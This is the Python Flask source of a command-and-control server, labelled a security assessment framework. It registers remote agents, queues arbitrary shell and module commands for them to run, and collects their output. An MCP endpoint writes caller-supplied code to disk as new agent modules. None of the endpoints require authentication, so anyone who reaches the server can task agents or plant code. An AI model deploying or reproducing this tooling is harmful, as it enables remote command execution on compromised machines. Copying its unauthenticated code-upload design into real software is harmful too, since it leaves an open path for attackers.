#!/usr/bin/env python3
"""
C2 Operator Server
Main control server for managing agents and security assessments
"""

from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import sys
import uuid
import threading
import time

# Add parent directory to path to import config
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import get_config

app = Flask(__name__)

# Load configuration
config = get_config()

# In-memory storage for agents and results
agents = {}
assessment_results = {}
pending_commands = {}

class Agent:
    def __init__(self, agent_id, hostname, platform, ip_address):
        self.agent_id = agent_id
        self.hostname = hostname
        self.platform = platform
        self.ip_address = ip_address
        self.last_seen = datetime.now()
        self.status = "active"
        self.commands_executed = 0

    def to_dict(self):
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": self.platform,
            "ip_address": self.ip_address,
            "last_seen": self.last_seen.isoformat(),
            "status": self.status,
            "commands_executed": self.commands_executed
        }

# Input validation helpers
def validate_uuid(value):
    """Validate UUID format"""
    if not value or not isinstance(value, str):
        return False
    try:
        uuid.UUID(value)
        return True
    except (ValueError, AttributeError):
        return False

def validate_string(value, min_len=1, max_len=1000):
    """Validate string input"""
    if not value or not isinstance(value, str):
        return False
    return min_len <= len(value) <= max_len

def validate_json_request(required_fields=None):
    """Validate JSON request has required fields"""
    if not request.json:
        return False, "No JSON data provided"

    if required_fields:
        for field in required_fields:
            if field not in request.json:
                return False, f"Missing required field: {field}"

    return True, None

@app.route('/api/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint"""
    # Validate request has JSON data
    valid, error = validate_json_request(['agent_id', 'hostname', 'platform'])
    if not valid:
        return jsonify({"status": "error", "message": error}), 400

    data = request.json
    agent_id = data.get('agent_id')
    hostname = data.get('hostname')
    platform = data.get('platform')

    # Validate agent_id format (UUID)
    if not validate_uuid(agent_id):
        return jsonify({"status": "error", "message": "Invalid agent_id format (must be UUID)"}), 400

    # Validate hostname
    if not validate_string(hostname, min_len=1, max_len=255):
        return jsonify({"status": "error", "message": "Invalid hostname"}), 400

    # Validate platform
    if not validate_string(platform, min_len=1, max_len=100):
        return jsonify({"status": "error", "message": "Invalid platform"}), 400

    ip_address = request.remote_addr

    if agent_id not in agents:
        agent = Agent(agent_id, hostname, platform, ip_address)
        agents[agent_id] = agent
        print(f"[+] New agent registered: {agent_id} ({hostname} - {platform})")
    else:
        agents[agent_id].last_seen = datetime.now()
        agents[agent_id].status = "active"
        print(f"[*] Agent re-registered: {agent_id}")

    return jsonify({"status": "success", "agent_id": agent_id})

@app.route('/api/checkin', methods=['POST'])
def agent_checkin():
    """Agent check-in and command retrieval"""
    # Validate request
    valid, error = validate_json_request(['agent_id'])
    if not valid:
        return jsonify({"status": "error", "message": error}), 400

    data = request.json
    agent_id = data.get('agent_id')

    # Validate agent_id
    if not validate_uuid(agent_id):
        return jsonify({"status": "error", "message": "Invalid agent_id format"}), 400

    # Check if agent exists
    if agent_id not in agents:
        return jsonify({"status": "error", "message": "Agent not registered"}), 404

    agents[agent_id].last_seen = datetime.now()

    # Check for pending commands
    if agent_id in pending_commands and pending_commands[agent_id]:
        command = pending_commands[agent_id].pop(0)
        return jsonify({"status": "success", "command": command})

    return jsonify({"status": "success", "command": None})

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Receive assessment results from agents"""
    # Validate request
    valid, error = validate_json_request(['agent_id', 'module', 'results'])
    if not valid:
        return jsonify({"status": "error", "message": error}), 400

    data = request.json
    agent_id = data.get('agent_id')
    module = data.get('module')
    results = data.get('results')

    # Validate agent_id
    if not validate_uuid(agent_id):
        return jsonify({"status": "error", "message": "Invalid agent_id format"}), 400

    # Validate module name
    if not validate_string(module, min_len=1, max_len=100):
        return jsonify({"status": "error", "message": "Invalid module name"}), 400

    # Validate results is a dict
    if not isinstance(results, dict):
        return jsonify({"status": "error", "message": "Results must be a JSON object"}), 400

    # Check if agent exists
    if agent_id not in agents:
        return jsonify({"status": "error", "message": "Agent not registered"}), 404

    agents[agent_id].last_seen = datetime.now()
    agents[agent_id].commands_executed += 1

    # Store results
    if agent_id not in assessment_results:
        assessment_results[agent_id] = []

    assessment_results[agent_id].append({
        "timestamp": datetime.now().isoformat(),
        "module": module,
        "results": results
    })

    print(f"[+] Received results from {agent_id} - Module: {module}")

    return jsonify({"status": "success"})

@app.route('/api/command', methods=['POST'])
def send_command():
    """Operator interface to send commands to agents"""
    # Validate request
    valid, error = validate_json_request(['agent_id', 'command'])
    if not valid:
        return jsonify({"status": "error", "message": error}), 400

    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')

    # Validate agent_id
    if not validate_uuid(agent_id):
        return jsonify({"status": "error", "message": "Invalid agent_id format"}), 400

    # Validate command is a dict
    if not isinstance(command, dict):
        return jsonify({"status": "error", "message": "Command must be a JSON object"}), 400

    # Validate command type
    cmd_type = command.get('type')
    if not cmd_type or cmd_type not in ['module', 'shell']:
        return jsonify({"status": "error", "message": "Invalid command type (must be 'module' or 'shell')"}), 400

    # Additional validation based on command type
    if cmd_type == 'module':
        if 'module' not in command or not validate_string(command['module']):
            return jsonify({"status": "error", "message": "Module command must have 'module' field"}), 400
    elif cmd_type == 'shell':
        if 'cmd' not in command or not validate_string(command['cmd']):
            return jsonify({"status": "error", "message": "Shell command must have 'cmd' field"}), 400

    # Check if agent exists
    if agent_id not in agents:
        return jsonify({"status": "error", "message": "Agent not found"}), 404

    if agent_id not in pending_commands:
        pending_commands[agent_id] = []

    pending_commands[agent_id].append(command)
    print(f"[+] Command queued for {agent_id}: {command}")

    return jsonify({"status": "success", "message": "Command queued"})

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """List all registered agents"""
    agent_list = [agent.to_dict() for agent in agents.values()]
    return jsonify({"agents": agent_list})

@app.route('/api/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    """Get assessment results for a specific agent"""
    if agent_id not in assessment_results:
        return jsonify({"results": []})

    return jsonify({"results": assessment_results[agent_id]})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "online",
        "active_agents": len([a for a in agents.values() if a.status == "active"]),
        "total_agents": len(agents)
    })

@app.route('/api/mcp/capabilities', methods=['GET'])
def get_mcp_capabilities():
    """Get framework capabilities for MCP integration"""
    from module_registry import MODULES, get_all_modules

    capabilities = {
        "framework": "C2 Security Assessment Framework",
        "version": "1.0",
        "features": {
            "agent_generation": True,
            "dynamic_modules": True,
            "multi_platform": True,
            "report_generation": True,
            "confidence_scoring": True
        },
        "supported_platforms": ["Windows", "Linux"],
        "available_modules": get_all_modules(),
        "module_count": len(MODULES),
        "report_formats": ["console", "json", "html", "markdown"],
        "api_endpoints": [
            "/api/register",
            "/api/checkin",
            "/api/results",
            "/api/command",
            "/api/agents",
            "/api/health",
            "/api/mcp/capabilities",
            "/api/mcp/add_module"
        ]
    }

    return jsonify(capabilities)

@app.route('/api/mcp/add_module', methods=['POST'])
def add_mcp_module():
    """Add a custom module dynamically via MCP"""
    # Validate request
    valid, error = validate_json_request(['module_name', 'module_code', 'description'])
    if not valid:
        return jsonify({"status": "error", "message": error}), 400

    data = request.json
    module_name = data.get('module_name')
    module_code = data.get('module_code')
    description = data.get('description')
    platforms = data.get('platforms', ['Linux', 'Windows'])

    # Validate module name
    if not validate_string(module_name, min_len=3, max_len=50):
        return jsonify({"status": "error", "message": "Invalid module name"}), 400

    if not module_name.replace('_', '').isalnum():
        return jsonify({"status": "error", "message": "Module name must be alphanumeric with underscores"}), 400

    # Validate module code
    if not validate_string(module_code, min_len=10, max_len=50000):
        return jsonify({"status": "error", "message": "Invalid module code"}), 400

    if "def run_assessment" not in module_code:
        return jsonify({"status": "error", "message": "Module code must define 'run_assessment' function"}), 400

    # Validate description
    if not validate_string(description, min_len=5, max_len=500):
        return jsonify({"status": "error", "message": "Invalid description"}), 400

    # Validate platforms
    if not isinstance(platforms, list):
        return jsonify({"status": "error", "message": "Platforms must be a list"}), 400

    try:
        from module_registry import MODULES

        # Check if module already exists
        if module_name in MODULES:
            return jsonify({"status": "error", "message": f"Module '{module_name}' already exists"}), 409

        # Create module file
        modules_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'agent', 'modules')
        module_file = os.path.join(modules_dir, f"{module_name}.py")

        if os.path.exists(module_file):
            return jsonify({"status": "error", "message": "Module file already exists"}), 409

        # Write module file
        module_content = f'''"""
{description}

Custom module dynamically added via MCP
"""

import platform

{module_code}

if __name__ == '__main__':
    results = run_assessment()
    import json
    print(json.dumps(results, indent=2))
'''

        with open(module_file, 'w') as f:
            f.write(module_content)

        # Update module registry in memory
        MODULES[module_name] = {
            "name": module_name.replace('_', ' ').title(),
            "description": description,
            "os": platforms,
            "priority": 5,
            "custom": True
        }

        print(f"[+] MCP: Added custom module '{module_name}'")

        return jsonify({
            "status": "success",
            "module_name": module_name,
            "description": description,
            "platforms": platforms,
            "module_file": module_file,
            "message": f"Module '{module_name}' added successfully"
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def cleanup_inactive_agents():
    """Background task to mark inactive agents"""
    inactive_timeout = config.get("server", "inactive_timeout") or 300
    while True:
        time.sleep(60)
        current_time = datetime.now()
        for agent in agents.values():
            time_diff = (current_time - agent.last_seen).total_seconds()
            if time_diff > inactive_timeout:
                if agent.status != "inactive":
                    agent.status = "inactive"
                    print(f"[-] Agent {agent.agent_id} marked as inactive")

if __name__ == '__main__':
    host = config.get("server", "host") or "0.0.0.0"
    port = config.get("server", "port") or 8542
    local_ip = config.get_local_ip()

    print("""
    ╔═══════════════════════════════════════╗
    ║     C2 Operator Server v1.0           ║
    ║   Security Assessment Framework       ║
    ╚═══════════════════════════════════════╝
    """)
    print(f"[*] Starting operator server on http://{host}:{port}")
    print(f"[*] Local IP: {local_ip}")
    print(f"[*] External URL: http://{local_ip}:{port}")
    print("[*] Use operator CLI to interact with agents")
    print(f"[*] Inactive agent timeout: {config.get('server', 'inactive_timeout')}s")

    # Start background cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
    cleanup_thread.start()

    app.run(host=host, port=port, debug=False)
